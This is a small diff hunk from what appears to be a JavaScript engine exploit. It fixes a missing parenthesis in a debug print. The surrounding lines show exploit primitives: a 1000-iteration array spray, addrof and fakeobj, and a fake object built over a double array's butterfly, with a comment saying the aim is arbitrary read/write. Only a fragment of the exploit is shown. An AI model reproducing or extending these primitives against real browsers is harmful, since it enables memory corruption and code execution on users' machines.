@@ -548,7 +548,7 @@ for (var i = 0; i < 1000; ++i) { //spray 1000 array no needed though it just bet
     //unboxed = 4.2; // Disable/undo CopyOnWrite (forced to make new Array which is ArrayWithDouble)
     //var boxed = [{}];
 
-    print("container @ " + new Int64(addrof(container));
+    print("container @ " + new Int64(addrof(container)));
 
     var hax = fakeobj(addrof(container) + 0x10); //hax will be our fakeobject which is just the victim1 arraywithdouble as a butterfly
 	//if this works without crashing then we now have fakeobject "hax" that can now do arbitrary r/w
